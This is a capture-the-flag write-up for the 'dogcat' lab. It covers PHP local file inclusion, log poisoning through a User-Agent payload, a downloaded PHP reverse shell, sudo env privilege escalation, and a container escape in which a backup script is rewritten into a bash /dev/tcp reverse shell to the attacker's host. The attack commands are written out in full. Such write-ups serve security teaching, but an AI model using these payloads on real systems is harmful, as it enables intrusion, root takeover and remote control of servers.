# dogcat

## Instructions

I made this website for viewing cat and dog images with PHP. If you're feeling down, come look at some dogs/cats! 

This machine may take a few minutes to fully start up.

## Analysis

### Nmap

Nmap reveals 2 open ports: 22 (ssh) and 80 (http):

~~~
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 24:31:19:2a:b1:97:1a:04:4e:2c:36:ac:84:0a:75:87 (RSA)
|_  256 c1:fb:7d:73:2b:57:4a:8b:dc:d7:6f:49:bb:3b:d0:20 (ED25519)
80/tcp open  http    Apache httpd 2.4.38 ((Debian))
|_http-server-header: Apache/2.4.38 (Debian)
|_http-title: dogcat
~~~

### Website

When you connect on port 80/tcp, you will have a very basic webpage with 2 buttons: `A dog` and `A cat` to view random dogs and cats.

```html
$ curl -s http://10.10.197.237
<!DOCTYPE HTML>
<html>

<head>
    <title>dogcat</title>
    <link rel="stylesheet" type="text/css" href="/style.css">
</head>

<body>
    <h1>dogcat</h1>
    <i>a gallery of various dogs or cats</i>

    <div>
        <h2>What would you like to see?</h2>
        <a href="/?view=dog"><button id="dog">A dog</button></a> <a href="/?view=cat"><button id="cat">A cat</button></a><br>
            </div>
</body>

</html>
```

### Directory listing

Clicking on the buttons will show dogs and cats, selected randomly.

All pictures are stored in the `/dog` (e.g. `http://10.10.197.237/dogs/8.jpg`) and `/cat` folders but directory listing is forbidden.

### Hidden files

* There is no `robots.txt` file at the root of the website:
* `gobuster` found nothing interesting.

### LFI / Directory traversal

After trying basic LFI, I eventually found that php filters are working to access files:

```
$ curl -s "http://10.10.197.237/?view=php://filter/read=convert.base64-encode/resource=./dog/../index"
<!DOCTYPE HTML>
<html>

<head>
    <title>dogcat</title>
    <link rel="stylesheet" type="text/css" href="/style.css">
</head>

<body>
    <h1>dogcat</h1>
    <i>a gallery of various dogs or cats</i>

    <div>
        <h2>What would you like to see?</h2>
        <a href="/?view=dog"><button id="dog">A dog</button></a> <a href="/?view=cat"><button id="cat">A cat</button></a><br>
        Here you go!PCFET0NUWVBFIEhUTUw+CjxodG1sPgoKPGhlYWQ+CiAgICA8dGl0bGU+ZG9nY2F0PC90aXRsZT4KICAgIDxsaW5rIHJlbD0ic3R5bGVzaGVldCIgdHlwZT0idGV4dC9jc3MiIGhyZWY9Ii9zdHlsZS5jc3MiPgo8L2hlYWQ+Cgo8Ym9keT4KICAgIDxoMT5kb2djYXQ8L2gxPgogICAgPGk+YSBnYWxsZXJ5IG9mIHZhcmlvdXMgZG9ncyBvciBjYXRzPC9pPgoKICAgIDxkaXY+CiAgICAgICAgPGgyPldoYXQgd291bGQgeW91IGxpa2UgdG8gc2VlPzwvaDI+CiAgICAgICAgPGEgaHJlZj0iLz92aWV3PWRvZyI+PGJ1dHRvbiBpZD0iZG9nIj5BIGRvZzwvYnV0dG9uPjwvYT4gPGEgaHJlZj0iLz92aWV3PWNhdCI+PGJ1dHRvbiBpZD0iY2F0Ij5BIGNhdDwvYnV0dG9uPjwvYT48YnI+CiAgICAgICAgPD9waHAKICAgICAgICAgICAgZnVuY3Rpb24gY29udGFpbnNTdHIoJHN0ciwgJHN1YnN0cikgewogICAgICAgICAgICAgICAgcmV0dXJuIHN0cnBvcygkc3RyLCAkc3Vic3RyKSAhPT0gZmFsc2U7CiAgICAgICAgICAgIH0KCSAgICAkZXh0ID0gaXNzZXQoJF9HRVRbImV4dCJdKSA/ICRfR0VUWyJleHQiXSA6ICcucGhwJzsKICAgICAgICAgICAgaWYoaXNzZXQoJF9HRVRbJ3ZpZXcnXSkpIHsKICAgICAgICAgICAgICAgIGlmKGNvbnRhaW5zU3RyKCRfR0VUWyd2aWV3J10sICdkb2cnKSB8fCBjb250YWluc1N0cigkX0dFVFsndmlldyddLCAnY2F0JykpIHsKICAgICAgICAgICAgICAgICAgICBlY2hvICdIZXJlIHlvdSBnbyEnOwogICAgICAgICAgICAgICAgICAgIGluY2x1ZGUgJF9HRVRbJ3ZpZXcnXSAuICRleHQ7CiAgICAgICAgICAgICAgICB9IGVsc2UgewogICAgICAgICAgICAgICAgICAgIGVjaG8gJ1NvcnJ5LCBvbmx5IGRvZ3Mgb3IgY2F0cyBhcmUgYWxsb3dlZC4nOwogICAgICAgICAgICAgICAgfQogICAgICAgICAgICB9CiAgICAgICAgPz4KICAgIDwvZGl2Pgo8L2JvZHk+Cgo8L2h0bWw+Cg==    </div>
</body>

</html>
```
### Website structure

I wrote a small [python script](files/req.py) and some wget commands to determine the structure of the website: 

~~~
/var/www/html/
├── cat.php
├── cats
│   ├── 10.jpg
│   ├── 1.jpg
│   ├── 2.jpg
│   ├── 3.jpg
│   ├── 4.jpg
│   ├── 5.jpg
│   ├── 6.jpg
│   ├── 7.jpg
│   ├── 8.jpg
│   └── 9.jpg
├── dog.php
├── dogs
│   ├── 10.jpg
│   ├── 1.jpg
│   ├── 2.jpg
│   ├── 3.jpg
│   ├── 4.jpg
│   ├── 5.jpg
│   ├── 6.jpg
│   ├── 7.jpg
│   ├── 8.jpg
│   └── 9.jpg
└── index.php
~~~

### /index.php

The `index.php` file is as follows:

```php
$ echo "PCFET0NUWVBFIEhUTUw+CjxodG1sPgoKPGhlYWQ+CiAgICA8dGl0bGU+ZG9nY2F0PC90aXRsZT4KICAgIDxsaW5rIHJlbD0ic3R5bGVzaGVldCIgdHlwZT0idGV4dC9jc3MiIGhyZWY9Ii9zdHlsZS5jc3MiPgo8L2hlYWQ+Cgo8Ym9keT4KICAgIDxoMT5kb2djYXQ8L2gxPgogICAgPGk+YSBnYWxsZXJ5IG9mIHZhcmlvdXMgZG9ncyBvciBjYXRzPC9pPgoKICAgIDxkaXY+CiAgICAgICAgPGgyPldoYXQgd291bGQgeW91IGxpa2UgdG8gc2VlPzwvaDI+CiAgICAgICAgPGEgaHJlZj0iLz92aWV3PWRvZyI+PGJ1dHRvbiBpZD0iZG9nIj5BIGRvZzwvYnV0dG9uPjwvYT4gPGEgaHJlZj0iLz92aWV3PWNhdCI+PGJ1dHRvbiBpZD0iY2F0Ij5BIGNhdDwvYnV0dG9uPjwvYT48YnI+CiAgICAgICAgPD9waHAKICAgICAgICAgICAgZnVuY3Rpb24gY29udGFpbnNTdHIoJHN0ciwgJHN1YnN0cikgewogICAgICAgICAgICAgICAgcmV0dXJuIHN0cnBvcygkc3RyLCAkc3Vic3RyKSAhPT0gZmFsc2U7CiAgICAgICAgICAgIH0KCSAgICAkZXh0ID0gaXNzZXQoJF9HRVRbImV4dCJdKSA/ICRfR0VUWyJleHQiXSA6ICcucGhwJzsKICAgICAgICAgICAgaWYoaXNzZXQoJF9HRVRbJ3ZpZXcnXSkpIHsKICAgICAgICAgICAgICAgIGlmKGNvbnRhaW5zU3RyKCRfR0VUWyd2aWV3J10sICdkb2cnKSB8fCBjb250YWluc1N0cigkX0dFVFsndmlldyddLCAnY2F0JykpIHsKICAgICAgICAgICAgICAgICAgICBlY2hvICdIZXJlIHlvdSBnbyEnOwogICAgICAgICAgICAgICAgICAgIGluY2x1ZGUgJF9HRVRbJ3ZpZXcnXSAuICRleHQ7CiAgICAgICAgICAgICAgICB9IGVsc2UgewogICAgICAgICAgICAgICAgICAgIGVjaG8gJ1NvcnJ5LCBvbmx5IGRvZ3Mgb3IgY2F0cyBhcmUgYWxsb3dlZC4nOwogICAgICAgICAgICAgICAgfQogICAgICAgICAgICB9CiAgICAgICAgPz4KICAgIDwvZGl2Pgo8L2JvZHk+Cgo8L2h0bWw+Cg==" | base64 -d
<!DOCTYPE HTML>
<html>

<head>
    <title>dogcat</title>
    <link rel="stylesheet" type="text/css" href="/style.css">
</head>

<body>
    <h1>dogcat</h1>
    <i>a gallery of various dogs or cats</i>

    <div>
        <h2>What would you like to see?</h2>
        <a href="/?view=dog"><button id="dog">A dog</button></a> <a href="/?view=cat"><button id="cat">A cat</button></a><br>
        <?php
            function containsStr($str, $substr) {
                return strpos($str, $substr) !== false;
            }
            $ext = isset($_GET["ext"]) ? $_GET["ext"] : '.php';
            if(isset($_GET['view'])) {
                if(containsStr($_GET['view'], 'dog') || containsStr($_GET['view'], 'cat')) {
                    echo 'Here you go!';
                    include $_GET['view'] . $ext;
                } else {
                    echo 'Sorry, only dogs or cats are allowed.';
                }
            }
        ?>
    </div>
</body>

</html>
```

We see that the script is checking if a parameter `ext` exists. If it doesn't, it will append `.php` to the included page (`view` parameter). We'll take advantage of that later to include non-php files.

It will also make sure that `dog` or `cat` is part of the `view` parameter, but here again, we will be able to bypass it (e.g. `./dog/../index`).

### /dog.php

```php
$ curl -s "http://10.10.197.237/?view=php://filter/read=convert.base64-encode/resource=dog" | grep "Here you go"
        Here you go!PGltZyBzcmM9ImRvZ3MvPD9waHAgZWNobyByYW5kKDEsIDEwKTsgPz4uanBnIiAvPg0K    </div>
```

```php
$ echo "PGltZyBzcmM9ImRvZ3MvPD9waHAgZWNobyByYW5kKDEsIDEwKTsgPz4uanBnIiAvPg0K" | base64 -d
<img src="dogs/<?php echo rand(1, 10); ?>.jpg" />
```

### /cat.php

```php
$ curl -s "http://10.10.197.237/?view=php://filter/read=convert.base64-encode/resource=cat" | grep "Here you go"
        Here you go!PGltZyBzcmM9ImNhdHMvPD9waHAgZWNobyByYW5kKDEsIDEwKTsgPz4uanBnIiAvPg0K    </div>
```

```php
$ echo "PGltZyBzcmM9ImNhdHMvPD9waHAgZWNobyByYW5kKDEsIDEwKTsgPz4uanBnIiAvPg0K" | base64 -d
<img src="cats/<?php echo rand(1, 10); ?>.jpg" />
```

### dogs directory

Notice that 4.jpg is much bigger in size than the other pictures:

~~~
$ ll
total 2412
-rw-rw-r--. 1 unknown unknown   49773 Mar  6 20:26 10.jpg
-rw-rw-r--. 1 unknown unknown   26225 Mar  6 20:25 1.jpg
-rw-rw-r--. 1 unknown unknown   65140 Mar  6 20:26 2.jpg
-rw-rw-r--. 1 unknown unknown   48304 Mar  6 20:26 3.jpg
-rw-rw-r--. 1 unknown unknown 2101810 Mar  6 20:26 4.jpg
-rw-rw-r--. 1 unknown unknown   29196 Mar  6 20:26 5.jpg
-rw-rw-r--. 1 unknown unknown   26712 Mar  6 20:26 6.jpg
-rw-rw-r--. 1 unknown unknown   29924 Mar  6 20:26 7.jpg
-rw-rw-r--. 1 unknown unknown   52679 Mar  6 20:26 8.jpg
-rw-rw-r--. 1 unknown unknown   19464 Mar  6 20:26 9.jpg
~~~

However, it doesn't seem to contain embedded files.

### Log poisoning

Taking advantage of the previous discoveries, let's try to read the apache log file:

~~~
$ curl -s "http://10.10.197.237/?view=./dog/../../../../var/log/apache2/access.log&ext"
<!DOCTYPE HTML>
<html>

<head>
    <title>dogcat</title>
    <link rel="stylesheet" type="text/css" href="/style.css">
</head>

<body>
    <h1>dogcat</h1>
    <i>a gallery of various dogs or cats</i>

    <div>
        <h2>What would you like to see?</h2>
        <a href="/?view=dog"><button id="dog">A dog</button></a> <a href="/?view=cat"><button id="cat">A cat</button></a><br>
        Here you go!127.0.0.1 - - [10/May/2020:10:26:47 +0000] "GET / HTTP/1.1" 200 615 "-" "curl/7.64.0"
127.0.0.1 - - [10/May/2020:10:27:24 +0000] "GET / HTTP/1.1" 200 615 "-" "curl/7.64.0"
127.0.0.1 - - [10/May/2020:10:28:07 +0000] "GET / HTTP/1.1" 200 615 "-" "curl/7.64.0"
127.0.0.1 - - [10/May/2020:10:28:48 +0000] "GET / HTTP/1.1" 200 615 "-" "curl/7.64.0"
127.0.0.1 - - [10/May/2020:10:29:28 +0000] "GET / HTTP/1.1" 200 615 "-" "curl/7.64.0"
127.0.0.1 - - [10/May/2020:10:30:05 +0000] "GET / HTTP/1.1" 200 615 "-" "curl/7.64.0"
127.0.0.1 - - [10/May/2020:10:30:36 +0000] "GET / HTTP/1.1" 200 615 "-" "curl/7.64.0"
10.9.0.54 - - [10/May/2020:10:30:57 +0000] "GET /?view=?page=php://filter/read=convert.base64-encode/resource=dog.php HTTP/1.1" 200 1064 "-" "curl/7.69.1"
127.0.0.1 - - [10/May/2020:10:31:06 +0000] "GET / HTTP/1.1" 200 615 "-" "curl/7.64.0"
10.9.0.54 - - [10/May/2020:10:31:11 +0000] "GET / HTTP/1.1" 200 537 "-" "Mozilla/5.0 (X11; Fedora; Linux x86_64; rv:76.0) Gecko/20100101 Firefox/76.0"

...[SNIP]...

127.0.0.1 - - [10/May/2020:11:24:08 +0000] "GET / HTTP/1.1" 200 615 "-" "curl/7.64.0"
127.0.0.1 - - [10/May/2020:11:24:38 +0000] "GET / HTTP/1.1" 200 615 "-" "curl/7.64.0"
127.0.0.1 - - [10/May/2020:11:25:08 +0000] "GET / HTTP/1.1" 200 615 "-" "curl/7.64.0"
127.0.0.1 - - [10/May/2020:11:25:39 +0000] "GET / HTTP/1.1" 200 615 "-" "curl/7.64.0"
127.0.0.1 - - [10/May/2020:11:26:09 +0000] "GET / HTTP/1.1" 200 615 "-" "curl/7.64.0"
127.0.0.1 - - [10/May/2020:11:26:39 +0000] "GET / HTTP/1.1" 200 615 "-" "curl/7.64.0"
10.9.0.54 - - [10/May/2020:11:26:40 +0000] "GET /?view=./dog/../../../var/log/apache2/access.log&ext HTTP/1.1" 200 1014 "-" "curl/7.69.1"
    </div>
</body>

</html>
~~~

See [req.py](files/req.py) for more information.

### Reverse shell

As we saw previously, we can exploit log poisonining but our objective now is to have a reverse shell. We can do that by injecting PHP code in our user-agent string:

```php
<?php file_put_contents('shell.php', file_get_contents('http://10.9.0.54/shell.php')); ?>
```

Let's first setup a basic http server that will server our `shell.php` file (https://raw.githubusercontent.com/pentestmonkey/php-reverse-shell/master/php-reverse-shell.php). Don't forget to modify the script to put your local IP.

Be sure to be in the directory where `shell.php` is and start a http listener:
~~~
$ sudo python -m http.server 80
Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ...
~~~

Then perform the below request:

~~~
$ curl -A "<?php file_put_contents('shell.php', file_get_contents('http://10.9.0.54/shell.php')); ?>" \
    "http://10.10.197.237/?view=./dog/../../../../var/log/apache2/access.log&ext"
~~~

## #1 - What is flag 1?

*Hint: There's more to *view* than just cats and dogs... *

Now, we have a reverse shell:

~~~
$ nc -nlvp 1234
Ncat: Version 7.80 ( https://nmap.org/ncat )
Ncat: Listening on :::1234
Ncat: Listening on 0.0.0.0:1234
Ncat: Connection from 10.10.197.237.
Ncat: Connection from 10.10.197.237:44922.
Linux 28e9b7daee8b 4.15.0-96-generic #97-Ubuntu SMP Wed Apr 1 03:25:46 UTC 2020 x86_64 GNU/Linux
 15:52:52 up  1:42,  0 users,  load average: 0.00, 0.01, 0.00
USER     TTY      FROM             LOGIN@   IDLE   JCPU   PCPU WHAT
uid=33(www-data) gid=33(www-data) groups=33(www-data)
/bin/sh: 0: can't access tty; job control turned off
$ cd /
$ find / -name *flag* 2>/dev/null
/proc/sys/kernel/acpi_video_flags
/proc/kpageflags
/var/www/html/flag.php
/var/www/flag2_QMW7JvaY2LvK.txt
/usr/bin/dpkg-buildflags
/usr/local/lib/php/build/ax_check_compile_flag.m4
/usr/lib/x86_64-linux-gnu/perl/5.28.1/bits/ss_flags.ph
/usr/lib/x86_64-linux-gnu/perl/5.28.1/bits/waitflags.ph
/usr/include/x86_64-linux-gnu/asm/processor-flags.h
/usr/include/x86_64-linux-gnu/bits/ss_flags.h
/usr/include/x86_64-linux-gnu/bits/waitflags.h
/usr/include/linux/kernel-page-flags.h
/usr/include/linux/tty_flags.h
/usr/share/dpkg/buildflags.mk
/sys/devices/pnp0/00:06/tty/ttyS0/flags
/sys/devices/platform/serial8250/tty/ttyS15/flags
/sys/devices/platform/serial8250/tty/ttyS6/flags
/sys/devices/platform/serial8250/tty/ttyS23/flags
/sys/devices/platform/serial8250/tty/ttyS13/flags
/sys/devices/platform/serial8250/tty/ttyS31/flags
/sys/devices/platform/serial8250/tty/ttyS4/flags
/sys/devices/platform/serial8250/tty/ttyS21/flags
/sys/devices/platform/serial8250/tty/ttyS11/flags
/sys/devices/platform/serial8250/tty/ttyS2/flags
/sys/devices/platform/serial8250/tty/ttyS28/flags
/sys/devices/platform/serial8250/tty/ttyS18/flags
/sys/devices/platform/serial8250/tty/ttyS9/flags
/sys/devices/platform/serial8250/tty/ttyS26/flags
/sys/devices/platform/serial8250/tty/ttyS16/flags
/sys/devices/platform/serial8250/tty/ttyS7/flags
/sys/devices/platform/serial8250/tty/ttyS24/flags
/sys/devices/platform/serial8250/tty/ttyS14/flags
/sys/devices/platform/serial8250/tty/ttyS5/flags
/sys/devices/platform/serial8250/tty/ttyS22/flags
/sys/devices/platform/serial8250/tty/ttyS12/flags
/sys/devices/platform/serial8250/tty/ttyS30/flags
/sys/devices/platform/serial8250/tty/ttyS3/flags
/sys/devices/platform/serial8250/tty/ttyS20/flags
/sys/devices/platform/serial8250/tty/ttyS10/flags
/sys/devices/platform/serial8250/tty/ttyS29/flags
/sys/devices/platform/serial8250/tty/ttyS1/flags
/sys/devices/platform/serial8250/tty/ttyS19/flags
/sys/devices/platform/serial8250/tty/ttyS27/flags
/sys/devices/platform/serial8250/tty/ttyS17/flags
/sys/devices/platform/serial8250/tty/ttyS8/flags
/sys/devices/platform/serial8250/tty/ttyS25/flags
/sys/devices/virtual/net/lo/flags
/sys/devices/virtual/net/eth0/flags
/sys/module/scsi_mod/parameters/default_dev_flags
~~~

Our first flag:

~~~
$ cat /var/www/html/flag.php
<?php
$flag_1 = "THM{Th1s_1s_N0t_4_Catdog_ab67edfa}"
?>
~~~

## #1 - What is flag 2?

Still using our reverse shell:

~~~
$ cat /var/www/flag2_QMW7JvaY2LvK.txt
THM{LF1_t0_RC3_aec3fb}
~~~

## #1 - What is flag 3?

We don't see flag3 in the list, probably because we need to elevate our privileges. Let's see our privileges:

~~~
$ sudo -l
Matching Defaults entries for www-data on 28e9b7daee8b:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin

User www-data may run the following commands on 28e9b7daee8b:
    (root) NOPASSWD: /usr/bin/env
~~~

We can run `/usr/bin/env` as `sudo` without password. Now, browsing https://gtfobins.github.io/gtfobins/env/, we see that we can take advantage of this to run a privileged shell with `sudo /usr/bin/env /bin/bash`:

~~~
$ sudo /usr/bin/env /bin/bash
$ whoami
root
$ find / -name *flag* 2>/dev/null
/proc/sys/kernel/acpi_video_flags
/proc/kpageflags
/var/www/html/flag.php
/var/www/flag2_QMW7JvaY2LvK.txt
/usr/bin/dpkg-buildflags
/usr/local/lib/php/build/ax_check_compile_flag.m4
/usr/lib/x86_64-linux-gnu/perl/5.28.1/bits/ss_flags.ph
/usr/lib/x86_64-linux-gnu/perl/5.28.1/bits/waitflags.ph
/usr/include/x86_64-linux-gnu/asm/processor-flags.h
/usr/include/x86_64-linux-gnu/bits/ss_flags.h
/usr/include/x86_64-linux-gnu/bits/waitflags.h
/usr/include/linux/kernel-page-flags.h
/usr/include/linux/tty_flags.h
/usr/share/dpkg/buildflags.mk
/root/flag3.txt
/sys/devices/pnp0/00:06/tty/ttyS0/flags
/sys/devices/platform/serial8250/tty/ttyS15/flags
/sys/devices/platform/serial8250/tty/ttyS6/flags
/sys/devices/platform/serial8250/tty/ttyS23/flags
/sys/devices/platform/serial8250/tty/ttyS13/flags
/sys/devices/platform/serial8250/tty/ttyS31/flags
/sys/devices/platform/serial8250/tty/ttyS4/flags
/sys/devices/platform/serial8250/tty/ttyS21/flags
/sys/devices/platform/serial8250/tty/ttyS11/flags
/sys/devices/platform/serial8250/tty/ttyS2/flags
/sys/devices/platform/serial8250/tty/ttyS28/flags
/sys/devices/platform/serial8250/tty/ttyS18/flags
/sys/devices/platform/serial8250/tty/ttyS9/flags
/sys/devices/platform/serial8250/tty/ttyS26/flags
/sys/devices/platform/serial8250/tty/ttyS16/flags
/sys/devices/platform/serial8250/tty/ttyS7/flags
/sys/devices/platform/serial8250/tty/ttyS24/flags
/sys/devices/platform/serial8250/tty/ttyS14/flags
/sys/devices/platform/serial8250/tty/ttyS5/flags
/sys/devices/platform/serial8250/tty/ttyS22/flags
/sys/devices/platform/serial8250/tty/ttyS12/flags
/sys/devices/platform/serial8250/tty/ttyS30/flags
/sys/devices/platform/serial8250/tty/ttyS3/flags
/sys/devices/platform/serial8250/tty/ttyS20/flags
/sys/devices/platform/serial8250/tty/ttyS10/flags
/sys/devices/platform/serial8250/tty/ttyS29/flags
/sys/devices/platform/serial8250/tty/ttyS1/flags
/sys/devices/platform/serial8250/tty/ttyS19/flags
/sys/devices/platform/serial8250/tty/ttyS27/flags
/sys/devices/platform/serial8250/tty/ttyS17/flags
/sys/devices/platform/serial8250/tty/ttyS8/flags
/sys/devices/platform/serial8250/tty/ttyS25/flags
/sys/devices/virtual/net/lo/flags
/sys/devices/virtual/net/eth0/flags
/sys/module/scsi_mod/parameters/default_dev_flags
~~~

We have our 3rd flag:
~~~
$ cat /root/flag3.txt
THM{D1ff3r3nt_3nv1ronments_874112}
~~~

## #1 - What is flag 4?

### Are we inside a container?

Still in our reverse shell, running the `hostname` command outputs `28e9b7daee8b`, which might be an indication that we are running inside a container.

Listing the different directories at the root of the system reveals that `/opt/` contains backups:

~~~
$ cd /opt
$ ls -l
total 4
drwxr-xr-x 2 root root 4096 May 10 17:47 backups
$ cd backups
$ ls -l
total 2884
-rwxr--r-- 1 root root      69 Mar 10 20:49 backup.sh
-rw-r--r-- 1 root root 2949120 May 10 17:51 backup.tar
~~~

Here is the content of the script:
~~~
$ cat backup.sh
#!/bin/bash
tar cf /root/container/backup/backup.tar /root/container
~~~

Also refreshing the `ls -l` command reveals that the `backup.tar` archive is saved every minute.


### Escaping the container

Let's take advantage of that to modify the script and create a reverse shell to the main server and hence, escape the container.

Let's go to http://pentestmonkey.net/cheat-sheet/shells/reverse-shell-cheat-sheet and get a bash reverse shell:

~~~
bash -i >& /dev/tcp/10.0.0.1/8080 0>&1
~~~

OK, let's transform the backup script into a reverse shell:

~~~
$ printf '#!/bin/bash\nbash -i >& /dev/tcp/10.9.0.54/8080 0>&1' > backup.sh
~~~

And open a listener on our machine:

~~~
$ nc -nlvp 8080
~~~

The output from the reverse shell:

~~~
$ nc -nlvp 8080
Ncat: Version 7.80 ( https://nmap.org/ncat )
Ncat: Listening on :::8080
Ncat: Listening on 0.0.0.0:8080
Ncat: Connection from 10.10.197.237.
Ncat: Connection from 10.10.197.237:36286.
bash: cannot set terminal process group (13166): Inappropriate ioctl for device
bash: no job control in this shell
root@dogcat:~# whoami
whoami
root
root@dogcat:~# hostname 
hostname
dogcat
root@dogcat:~# ls -l
ls -l
total 8
drwxr-xr-x 5 root root 4096 Mar 10 20:52 container
-rw-r--r-- 1 root root   80 Mar 10 19:54 flag4.txt
root@dogcat:~# cat flag4.txt
cat flag4.txt
THM{esc4l4tions_on_esc4l4tions_on_esc4l4tions_7a52b17dba6ebb0dc38bc1049bcba02d}
~~~